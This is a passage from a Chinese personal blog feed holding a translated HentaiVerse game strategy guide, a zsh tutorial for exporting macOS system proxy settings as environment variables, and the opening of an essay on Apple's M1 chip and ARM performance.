Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 